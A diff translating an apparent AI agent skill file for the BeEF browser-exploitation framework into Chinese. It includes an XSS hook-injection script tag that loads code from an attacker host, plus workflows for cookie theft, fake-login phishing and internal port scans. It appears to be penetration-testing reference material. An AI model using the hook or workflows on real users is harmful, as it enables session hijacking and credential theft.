@@ -1,17 +1,14 @@
 ---
 name: beef
 description: >
-  This skill should be used when the user asks about "beef", "you have XSS on
-  a target to pivot into browser-side attacks, session hijacking, and social
-  engineering". Browser Exploitation Framework — hook browsers via
-  XSS/injected JS and perform client-side attacks.
+  此技能适用于用户询问关于 "beef"、"在目标上已有 XSS 漏洞，需要转向浏览器端攻击、会话劫持和社会工程学" 等内容。浏览器漏洞利用框架 (Browser Exploitation Framework) — 通过 XSS/注入 JS 挂钩浏览器并执行客户端攻击。
 ---
 
 # BeEF (Browser Exploitation Framework)
 
-Hook browsers via XSS and execute client-side attacks from a web console.
+通过 XSS 挂钩浏览器，并从 Web 控制台执行客户端攻击。
 
-## Quick Start
+## 快速开始
 
 ```bash
 # Kali
@@ -26,44 +23,44 @@ cd beef && ./install && ./beef
 # Hook URL: http://YOUR_IP:3000/hook.js
 ```
 
-## Inject Hook
+## 注入 Hook
 
 ```html
 <!-- Inject in XSS payload or MITM response -->
 <script src="http://YOUR_IP:3000/hook.js"></script>
 ```
 
-## Key Module Categories
+## 主要模块类别
 
-| Category | Examples |
+| 类别 | 示例 |
 |----------|---------|
-| Network | Port scanner, ping sweep, SSRF |
-| Browser | Fingerprint, clipboard steal, camera access |
-| Social Engineering | Fake login, fake update, clickjacking |
-| Exploits | Browser CVEs, Java exploits |
-| Persistence | Persistent hook via service worker |
-| Misc | Keylogger, screenshot, geolocation |
+| 网络 (Network) | 端口扫描、Ping 扫描、SSRF |
+| 浏览器 (Browser) | 指纹识别、剪贴板窃取、摄像头访问 |
+| 社会工程学 (Social Engineering) | 伪造登录、伪造更新、点击劫持 |
+| 漏洞利用 (Exploits) | 浏览器 CVE、Java 漏洞 |
+| 持久化 (Persistence) | 通过 Service Worker 实现持久 Hook |
+| 其他 (Misc) | 键盘记录、截图、地理定位 |
 
-## Common Workflows
+## 常见工作流程
 
-**Steal cookies via hooked browser:**
+**通过已挂钩的浏览器窃取 Cookie：**
 ```
 Modules > Browser > Hooked Domain > Get Cookie
 ```
 
-**Phishing via fake login overlay:**
+**通过伪造登录覆层进行钓鱼：**
 ```
 Modules > Social Engineering > Pretty Theft
 ```
 
-**Port scan internal network from browser:**
+**从浏览器扫描内网端口：**
 ```
 Modules > Network > Port Scanner
 # Set targets: 192.168.1.1-254
 ```
 
-## Resources
+## 资源
 
-| File | When to load |
+| 文件 | 加载时机 |
 |------|--------------|
-| `references/` | Module list and hook persistence techniques |
+| `references/` | 模块列表与 Hook 持久化技术 |
